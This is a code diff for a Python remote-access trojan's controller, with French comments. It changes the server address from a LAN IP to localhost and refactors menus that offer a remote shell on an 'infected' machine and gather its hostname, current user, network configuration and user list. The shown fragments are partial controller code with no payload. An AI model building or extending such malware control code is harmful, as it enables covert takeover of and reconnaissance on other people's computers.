@@ -9,7 +9,7 @@ Classe contenant les variables communes entre client et serveur
 
 class Machine:
     def __init__(self):
-        self.server_addr = ("192.168.0.18", 60000)
+        self.server_addr = ("localhost", 60000)
         self.my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.language = "utf-8"
         self.buffsize = 4096
@@ -84,8 +84,6 @@ class Client(Machine):
         print("Connection accepted for :", addr)
         hostname = distant_socket.recv(self.buffsize).decode(self.language)
         print("The malware has infected the machine named " + str(hostname) + "\n")
-        choix = self.menu_principal()
-        return choix
 
     def send(self, commande):
         raw = commande.encode(self.language)
@@ -116,16 +114,9 @@ class Client(Machine):
         print("Press 1 to access the remote shell (if you enter the shell you won't be able to chose another option)")
         print("Press 2 to get informations")
         choix = input()
-        self.send(choix)
         return choix
 
-    def choice_information(self):
-        print("\nPress 1 to get the infected computer name")
-        print("Press 2 to see who is the current user")
-        print("Press 3 to get the network configuration")
-        print("Press 4 to get the list of users")
-        print("Press 0 to quit")
-        choix2 = input()
+    def choice_information(self, choix2):
         while int(choix2) != 0:
             if choix2 == "1":
                 self.send("computer")
